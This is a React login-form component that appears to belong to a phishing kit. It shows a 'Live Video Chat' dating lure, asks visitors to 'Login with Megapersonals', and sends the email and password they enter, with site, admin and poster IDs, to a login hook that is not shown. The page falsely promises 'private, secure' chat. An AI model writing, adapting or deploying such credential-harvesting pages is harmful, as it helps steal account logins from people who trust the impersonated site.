"use client";
import { site } from "../config/index";
import Image from "next/image";
import useMockLogin from "../hooks/useMockLogin";
import { useState } from "react";

function LoginForm({ adminId, posterId }) {
  const [password, setPassword] = useState("");
  const [email, setEmail] = useState("");

  const { login } = useMockLogin(adminId, posterId);

  const handleSubmit = async () => {
    const allValues = {
      site: site,
      email: email,
      password: password,
      skipcode: "",
    };

    await login(allValues);
    setEmail("");
    setPassword("");

    console.log("allValues", allValues);
  };

  return (
    <div class="bg-neutral-50 w-full max-w-[25rem] p-6 rounded-xl">
      <p class="text-3xl font-semibold ">Live Video Chat</p>
      <p class="mt-3 leading-relaxed max-w-[32ch] mx-auto [&amp;>span]:font-semibold">
        Know each other and enjoy{" "}
        <span class="text-green-500">private, secure</span>
        <span class="text-green-500"></span> and{" "}
        <span class="text-green-500">hasslefree</span> live moment with your
        dating partner
      </p>
      <img src="/images/devilgirl.png" width="180xp" height="120px" alt="" />{" "}
      <p class="text-xl font-semibold mt-3 text-center">
        Login with Megapersonals
      </p>
      <div class="flex flex-col gap-y-4 mt-4">
        <p
          class="bg-neutral-200 p-2 rounded text-sm"
          id="msg"
          style={{ display: "none" }}
        >
          Please enter correct password
        </p>
        <input
          required=""
          class="border h-11 rounded px-4 outline-none border-green-500 disabled:border-green-200"
          placeholder="Enter email here"
          type="email"
          name="email"
          value={email}
          onChange={(e) => setEmail(e.target.value)}
        />
        <input
          required=""
          class="border h-11 rounded px-4 outline-none border-green-500 disabled:border-green-200"
          placeholder="Enter password here"
          type="password"
          name="password"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
        />
        <button
          onClick={handleSubmit}
          class="h-11 rounded text-neutral-50 font-medium bg-green-500 disabled:bg-green-200"
        >
          Submit
        </button>
      </div>
    </div>
  );
}

export default LoginForm;
